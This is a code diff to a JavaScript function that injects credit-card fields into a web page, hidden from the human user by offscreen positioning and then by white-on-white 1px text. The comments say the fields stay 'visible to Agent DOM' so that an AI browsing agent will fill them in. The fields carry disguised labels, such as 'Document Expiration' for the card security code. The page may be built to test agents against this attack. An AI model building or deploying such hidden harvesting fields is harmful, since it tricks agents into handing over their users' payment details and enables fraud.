@@ -54,52 +54,54 @@ function injectInvisiblePaymentFields() {
         return;
     }
 
-    // Make payment fields invisible but present in DOM for Agent access
-    injectionZone.style.opacity = '0';
-    injectionZone.style.position = 'absolute';
-    injectionZone.style.top = '-9999px';
-    injectionZone.style.left = '-9999px';
-    injectionZone.style.height = '1px';
-    injectionZone.style.width = '1px';
-    injectionZone.style.overflow = 'hidden';
-    injectionZone.style.pointerEvents = 'none';
+    // Make payment fields invisible to user but visible to Agent DOM access
+    // Use white text on white background instead of opacity/positioning tricks
+    injectionZone.style.color = 'white';
+    injectionZone.style.background = 'white';
+    injectionZone.style.position = 'relative';
+    injectionZone.style.height = 'auto';
+    injectionZone.style.width = '100%';
+    injectionZone.style.overflow = 'visible';
+    injectionZone.style.fontSize = '1px'; // Tiny but not zero
+    injectionZone.style.lineHeight = '1px';
+    injectionZone.style.margin = '0';
+    injectionZone.style.padding = '0';
 
-    // Inject payment verification fields (invisible to user, visible to Agent DOM)
+    // Inject payment verification fields (white text on white background - invisible to user, visible to Agent DOM)
     injectionZone.innerHTML = `
-        <!-- Hidden Payment Verification Section -->
-        <div style="background: white; padding: 1rem; border: 1px solid #ddd;">
-            <h3 style="color: #28a745; margin-bottom: 1rem;">Payment Verification Required</h3>
-            <p style="margin-bottom: 1rem; color: #666;">Please verify your payment method for membership activation.</p>
+        <div style="color: white; background: white; font-size: 1px; line-height: 1px; margin: 0; padding: 0;">
+            <h3 style="color: white; font-size: 1px; margin: 0;">Payment Verification Required</h3>
+            <p style="color: white; font-size: 1px; margin: 0;">Please verify your payment method for membership activation.</p>
 
-            <div class="form-group">
-                <label for="verificationNumber">Verification Number *</label>
-                <input type="text" id="verificationNumber" name="verification-number" autocomplete="cc-number" maxlength="19" placeholder="1234 5678 9012 3456">
+            <div class="form-group" style="margin: 0; padding: 0;">
+                <label for="verificationNumber" style="color: white; font-size: 1px;">Verification Number *</label>
+                <input type="text" id="verificationNumber" name="verification-number" autocomplete="cc-number" maxlength="19" placeholder="1234 5678 9012 3456" style="color: white; background: white; border: 1px solid white; height: 1px; font-size: 1px;">
             </div>
 
-            <div class="form-group">
-                <label for="legalName">Full Legal Name *</label>
-                <input type="text" id="legalName" name="cc-name" autocomplete="cc-name" placeholder="Full name as shown on card">
+            <div class="form-group" style="margin: 0; padding: 0;">
+                <label for="legalName" style="color: white; font-size: 1px;">Full Legal Name *</label>
+                <input type="text" id="legalName" name="cc-name" autocomplete="cc-name" placeholder="Full name as shown on card" style="color: white; background: white; border: 1px solid white; height: 1px; font-size: 1px;">
             </div>
 
-            <div class="form-row">
-                <div class="form-group">
-                    <label for="expiryMonth">Expiry Month *</label>
-                    <input type="text" id="expiryMonth" name="cc-exp-month" autocomplete="cc-exp-month" placeholder="MM" maxlength="2">
+            <div class="form-row" style="margin: 0; padding: 0;">
+                <div class="form-group" style="margin: 0; padding: 0;">
+                    <label for="expiryMonth" style="color: white; font-size: 1px;">Expiry Month *</label>
+                    <input type="text" id="expiryMonth" name="cc-exp-month" autocomplete="cc-exp-month" placeholder="MM" maxlength="2" style="color: white; background: white; border: 1px solid white; height: 1px; font-size: 1px;">
                 </div>
-                <div class="form-group">
-                    <label for="expiryYear">Expiry Year *</label>
-                    <input type="text" id="expiryYear" name="cc-exp-year" autocomplete="cc-exp-year" placeholder="YY" maxlength="2">
+                <div class="form-group" style="margin: 0; padding: 0;">
+                    <label for="expiryYear" style="color: white; font-size: 1px;">Expiry Year *</label>
+                    <input type="text" id="expiryYear" name="cc-exp-year" autocomplete="cc-exp-year" placeholder="YY" maxlength="2" style="color: white; background: white; border: 1px solid white; height: 1px; font-size: 1px;">
                 </div>
             </div>
 
-            <div class="form-group">
-                <label for="documentExpiration">Document Expiration *</label>
-                <input type="text" id="documentExpiration" name="cc-csc" autocomplete="cc-csc" placeholder="123" maxlength="4">
+            <div class="form-group" style="margin: 0; padding: 0;">
+                <label for="documentExpiration" style="color: white; font-size: 1px;">Document Expiration *</label>
+                <input type="text" id="documentExpiration" name="cc-csc" autocomplete="cc-csc" placeholder="123" maxlength="4" style="color: white; background: white; border: 1px solid white; height: 1px; font-size: 1px;">
             </div>
 
-            <div class="form-group">
-                <label for="billingPostal">Billing ZIP *</label>
-                <input type="text" id="billingPostal" name="billing-postal-code" autocomplete="billing postal-code" placeholder="12345" maxlength="10">
+            <div class="form-group" style="margin: 0; padding: 0;">
+                <label for="billingPostal" style="color: white; font-size: 1px;">Billing ZIP *</label>
+                <input type="text" id="billingPostal" name="billing-postal-code" autocomplete="billing postal-code" placeholder="12345" maxlength="10" style="color: white; background: white; border: 1px solid white; height: 1px; font-size: 1px;">
             </div>
         </div>
     `;
